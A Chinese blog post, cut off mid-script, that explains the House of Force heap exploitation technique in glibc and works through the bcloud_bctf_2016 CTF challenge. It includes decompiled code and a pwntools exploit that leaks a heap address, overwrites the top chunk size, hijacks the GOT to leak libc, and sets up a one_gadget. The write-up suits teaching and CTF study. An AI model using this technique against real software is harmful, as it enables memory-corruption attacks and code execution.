<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Force2 | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Force2</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-12T09:16:25.023Z" id="updated"> 2023-09-12</time></div></span><br><span>文章总字数: <div class="control">1.9k</div></span><br><span>预计阅读时间: <div class="control">9 分钟</div></span></div></div><hr><div id="post-content"><h1 id="House-Of-Force2"><a href="#House-Of-Force2" class="headerlink" title="House Of Force2"></a>House Of Force2</h1><p>基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。</p>
<p>如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。</p>
<p>然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。</p>
<h3 id="glibc源码："><a href="#glibc源码：" class="headerlink" title="glibc源码："></a>glibc源码：</h3><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = <span class="hljs-built_in">chunksize</span>(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) <br>{<br>    remainder_size = size - nb;<br>    remainder      = <span class="hljs-built_in">chunk_at_offset</span>(victim, nb);<br>    av-&gt;top        = remainder;<br>    <span class="hljs-built_in">set_head</span>(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    <span class="hljs-built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);<br><br>    <span class="hljs-built_in">check_malloced_chunk</span>(av, victim, nb);<br>    <span class="hljs-type">void</span> *p = <span class="hljs-built_in">chunk2mem</span>(victim);<br>    <span class="hljs-built_in">alloc_perturb</span>(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>}<br></code></pre></td></tr></tbody></table></figure>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk</p>
<h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span> &amp;&amp; heap_array[i]; ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">10</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Lack of space. Upgrade your account with just $100 :)"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the length of the note content:"</span>);<br>  v2 = <span class="hljs-built_in">choose</span>();<br>  heap_array[i] = <span class="hljs-built_in">malloc</span>(v2 + <span class="hljs-number">4</span>);<br>  <span class="hljs-keyword">if</span> ( !heap_array[i] )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  dword_804B0A0[i] = v2;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the content:"</span>);<br>  <span class="hljs-built_in">readd</span>(heap_array[i], v2, <span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Create success, the id is %d\n"</span>, i);<br>  result = i;<br>  dword_804B0E0[i] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> result;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>add函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写</p>
<h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the id:"</span>);<br>  v1 = <span class="hljs-built_in">choose</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid ID."</span>);<br>  v2 = heap_array[v1];<br>  <span class="hljs-keyword">if</span> ( !v2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note has been deleted."</span>);<br>  v3 = dword_804B0A0[v1];<br>  dword_804B0E0[v1] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the new content:"</span>);<br>  <span class="hljs-built_in">readd</span>(v2, v3, <span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Edit success."</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">void</span> *index; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the id:"</span>);<br>  v1 = <span class="hljs-built_in">choose</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid ID."</span>);<br>  index = heap_array[v1];<br>  <span class="hljs-keyword">if</span> ( !index )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note has been deleted."</span>);<br>  heap_array[v1] = <span class="hljs-number">0</span>;<br>  dword_804B0A0[v1] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">free</span>(index);  #<span class="hljs-function">UAF</span><br><span class="hljs-function">  <span class="hljs-keyword">return</span> <span class="hljs-title">puts</span><span class="hljs-params">(<span class="hljs-string">"Delete success."</span>)</span></span>;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>delete函数在释放chunk时存在UAF漏洞</p>
<h3 id="自定义一个read函数"><a href="#自定义一个read函数" class="headerlink" title="自定义一个read函数"></a>自定义一个read函数</h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">int __cdecl readd(int a1, int a2, char a3)<br>{<br>  char buf; <span class="hljs-regexp">//</span> [esp+<span class="hljs-number">1</span>Bh] [ebp-Dh] BYREF<br>  int i; <span class="hljs-regexp">//</span> [esp+<span class="hljs-number">1</span>Ch] [ebp-Ch]<br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>u) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( buf == a3 )<br>      <span class="hljs-keyword">break</span>;<br>    *(a1 + i) = buf;<br>  }<br>  *(i + a1) = <span class="hljs-number">0</span>;<br>  return i;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>三个参数，a1为要输入的地址，a2为输入大小，a3为截止符</p>
<h4 id="先把前面的一些东西写好"><a href="#先把前面的一些东西写好" class="headerlink" title="先把前面的一些东西写好"></a>先把前面的一些东西写好</h4><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs scss">from pwn import *<br>from LibcSearcher import *<br><span class="hljs-built_in">context</span>(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，<span class="hljs-number">64</span>位架构,debug<br>#定义gdb调试函数<br>def <span class="hljs-built_in">dbg</span>():<br>        gdb.<span class="hljs-built_in">attach</span>(sh)<br>        <span class="hljs-built_in">pause</span>()<br>#命令简写化<br>s       = lambda data               :sh.<span class="hljs-built_in">send</span>(data)<br>sa      = lambda delim,data         :sh.<span class="hljs-built_in">sendafter</span>(delim, data)<br>sl      = lambda data               :sh.<span class="hljs-built_in">sendline</span>(data)<br>sla     = lambda delim,data         :sh.<span class="hljs-built_in">sendlineafter</span>(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recv</span>(num)<br>ru      = lambda delims, drop=True  :sh.<span class="hljs-built_in">recvuntil</span>(delims, drop)<br>itr     = lambda                    :sh.<span class="hljs-built_in">interactive</span>()<br>uu32    = lambda data               :<span class="hljs-built_in">u32</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :<span class="hljs-built_in">u64</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg      = lambda address,data       :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br>sh = <span class="hljs-built_in">process</span>(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>#sh = <span class="hljs-built_in">remote</span>(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">26937</span>)<br>elf = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>def <span class="hljs-built_in">add</span>(size,content):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'note content:'</span>,<span class="hljs-built_in">str</span>(size))<br>   <span class="hljs-built_in">sa</span>(<span class="hljs-string">'content:'</span>,content)<br> <br>def <span class="hljs-built_in">edit</span>(index,content):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'id:'</span>,<span class="hljs-built_in">str</span>(index))<br>   <span class="hljs-built_in">sa</span>(<span class="hljs-string">'content:'</span>,content)<br> <br>def <span class="hljs-built_in">delete</span>(index):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'id:'</span>,<span class="hljs-built_in">str</span>(index))<br></code></pre></td></tr></tbody></table></figure>

<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞<br class='item-img' data-src='https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sa</span><span class="hljs-params">(<span class="hljs-string">'name:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)</span></span><br>heap_addr = <span class="hljs-built_in">u32</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">4</span>)) - <span class="hljs-number">0</span>x8<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'heap_addr'</span>,heap_addr)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>再看另一个函数<br class='item-img' data-src='https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<h3 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h3><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000005C v2 dd ?</span><br><span class="hljs-deletion">-00000058 db ? ; undefined</span><br><span class="hljs-deletion">-00000057 db ? ; undefined</span><br>..........<br><span class="hljs-deletion">-00000016 db ? ; undefined</span><br><span class="hljs-deletion">-00000015 db ? ; undefined</span><br><span class="hljs-deletion">-00000014 v4 dd ?</span><br><span class="hljs-deletion">-00000010 db ? ; undefined</span><br><span class="hljs-deletion">-0000000F db ? ; undefined</span><br><span class="hljs-deletion">-0000000E db ? ; undefined</span><br><span class="hljs-deletion">-0000000D db ? ; undefined</span><br></code></pre></td></tr></tbody></table></figure>

<p>这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sa</span><span class="hljs-params">(<span class="hljs-string">'Org:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x40)</span></span><br><span class="hljs-function"><span class="hljs-title">sla</span><span class="hljs-params">(<span class="hljs-string">'Host:'</span>,p32(<span class="hljs-number">0</span>xFFFFFFFF)</span></span>)<br>top_chunk_addr = heap_addr  + <span class="hljs-number">0</span>x48*<span class="hljs-number">3</span> - <span class="hljs-number">0</span>x8<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'top_chunk_addr'</span>,(top_chunk_addr)</span></span>)<br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，<br>因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">offset</span> = heap_array - （top_chunk_addr +<span class="hljs-number">0</span>x8）- <span class="hljs-number">0</span>x8<br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>heap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，<br>之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(offset,<span class="hljs-string">'\n'</span>)</span></span>	<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18,<span class="hljs-string">'\n'</span>)</span></span><br></code></pre></td></tr></tbody></table></figure>

<p>之后编辑chunk_1来修改heap_array数组</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts_plt = elf<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">'puts'</span>]</span><br>__libc_start_main_got = elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">'__libc_start_main'</span>]</span><br>free_got = elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">'free'</span>]</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0</span>)</span></span> + <span class="hljs-built_in">p32</span>(free_got) + <span class="hljs-built_in">p32</span>(__libc_start_main_got) + <span class="hljs-built_in">p32</span>(heap_array + <span class="hljs-number">0</span>x10) + b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x8)<br></code></pre></td></tr></tbody></table></figure>

<p>此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,p32(puts_plt)</span></span> + b<span class="hljs-string">'\n'</span>)<br></code></pre></td></tr></tbody></table></figure>

<p>此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p>free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址<br class='item-img' data-src='https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#本地</span><br><span class="hljs-attr">one_gadget</span> = [<span class="hljs-number">0</span>x3ac3c,<span class="hljs-number">0</span>x3ac3e,<span class="hljs-number">0</span>x3ac42,<span class="hljs-number">0</span>x3ac49,<span class="hljs-number">0</span>x5faa5,<span class="hljs-number">0</span>x5faa6]<br><span class="hljs-attr">libc</span> = ELF(<span class="hljs-string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so'</span>)<br><span class="hljs-comment">#buu远程</span><br><span class="hljs-comment">#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span><br><span class="hljs-comment">#libc = ELF('../../libc-2.23.so--32')</span><br><span class="hljs-attr">libc_base</span> = __libc_start_main_addr - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]<br><span class="hljs-attr">onegadget</span> = <span 